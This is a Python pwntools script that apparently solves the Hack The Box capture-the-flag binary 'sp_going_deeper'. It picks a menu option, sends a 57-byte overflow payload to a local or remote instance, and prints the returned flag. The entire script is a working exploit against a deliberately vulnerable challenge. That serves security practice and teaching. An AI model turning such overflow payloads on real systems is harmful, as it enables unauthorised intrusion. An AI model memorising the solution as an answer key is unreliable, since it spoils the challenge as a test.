#!/usr/bin/env python3

from pwn import context, log, remote, sys

context.binary = 'sp_going_deeper'


def get_process():
    if len(sys.argv) == 1:
        return context.binary.process()

    host, port = sys.argv[1].split(':')
    return remote(host, int(port))


def main():
    p = get_process()
    p.sendlineafter(b'>> ', b'1')
    p.sendafter(b'[*] Input: ', b'\x01' * 57)
    p.recvuntil(b'HTB')
    log.success(f'Flag: HTB{p.recvline().strip().decode()}')
    p.close()


if __name__ == '__main__':
    main()
